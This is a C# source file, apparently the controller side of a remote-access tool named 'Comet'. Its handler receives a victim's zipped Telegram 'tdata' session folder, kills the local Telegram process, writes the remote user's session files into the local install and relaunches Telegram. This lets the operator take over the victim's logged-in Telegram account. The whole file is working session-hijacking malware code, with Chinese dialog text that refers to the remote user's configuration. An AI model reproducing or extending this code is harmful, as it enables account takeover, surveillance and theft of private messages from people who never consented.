using Comet.Common.Messages;
using Comet.Common.Networking;
using Comet.Server.Forms;
using Comet.Server.Networking;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Comet.Server.Messages
{
    public class TelegramHandler :  MessageProcessorBase<string>
    {
        public TelegramHandler() : base(true)
        {
        }
        /// <summary>
        /// 在lock语句中用于同步UI线程和线程池之间对<see cref="_codec"/>的访问。
        /// </summary>
        private readonly object _syncLock = new object();
        public override bool CanExecute(IMessage message) => message is Telegram;

        public override bool CanExecuteFrom(ISender sender) => true;

        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case Telegram msg:
                    Execute(sender, msg);
                    break;
            }
        }
        private void Execute(ISender client, Telegram message)
        {
            if (message.Files!=null && message.Files.Length >0)
            {
                Process[] proc = Process.GetProcessesByName("Telegram");
                if (proc.Length > 0)
                {
                    if (MessageBox.Show("是否结束正在运行的Telegram？并把远程用户的配置写入，\n然后重新启动Telegram", "是否结束Telegram？", MessageBoxButtons.OKCancel) == DialogResult.OK)
                    {
                        foreach (var item in proc) item.Kill();
                        Thread.Sleep(100);
                    }
                }
                string tgPath = GetTelegramPath();
                string tgTDataPath = Path.GetDirectoryName(tgPath) + @"\tdata";
                Directory.CreateDirectory(tgTDataPath);
                File.WriteAllBytes(tgTDataPath + "tdata.zip", message.Files);
                if (Directory.Exists(tgTDataPath))
                {
                    Directory.Delete(tgTDataPath, true);
                }
                ZipFile.ExtractToDirectory(tgTDataPath + "tdata.zip", tgTDataPath);
                Process.Start(tgPath);
            }
            else
            {
                MessageBox.Show("对方没有安装Telegram，或者安装路径没有找到", "获取失败");
            }
        }

        string GetTelegramPath()
        {
            Microsoft.Win32.RegistryKey subKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Classes\tdesktop.tg\DefaultIcon");
            if (subKey != null)
            {
                string path = (string)subKey.GetValue("");
                if (path != null)
                {
                    return path.Substring(1, path.Length - 4);
                }
                else
                {
                    return "";
                }
            }
            else
            {
                return "";
            }
        }
    }
}
